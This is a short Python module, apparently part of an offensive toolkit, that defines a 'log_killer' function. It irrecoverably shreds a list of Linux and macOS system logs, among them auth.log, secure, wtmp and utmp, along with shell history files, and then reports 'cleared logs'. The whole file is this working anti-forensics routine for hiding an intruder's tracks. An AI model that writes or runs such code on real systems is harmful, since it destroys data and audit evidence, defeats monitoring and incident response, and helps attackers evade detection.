from core.config.functions import path, exec_command, msg


# clear logs
def log_killer():
    log_list = (
        "/var/log/messages", "/var/log/auth.log", "/var/log/kern.log", "/var/log/cron.log", "/var/log/maillog",
        "/var/log/boot.log", "/var/log/mysqld.log", "/var/log/secure", "/var/log/utmp", "/var/log/wtmp",
        "/var/log/yum.log", "/var/log/system.log", "/var/log/DiagnosticMessages", "~/.zsh_history", "~/.bash_history")
    for log in log_list:
        if path.isfile(log) == True or path.isdir(log) == True:
            exec_command(f"shred -vfzu {log} > /dev/null")
    msg("cleared logs")
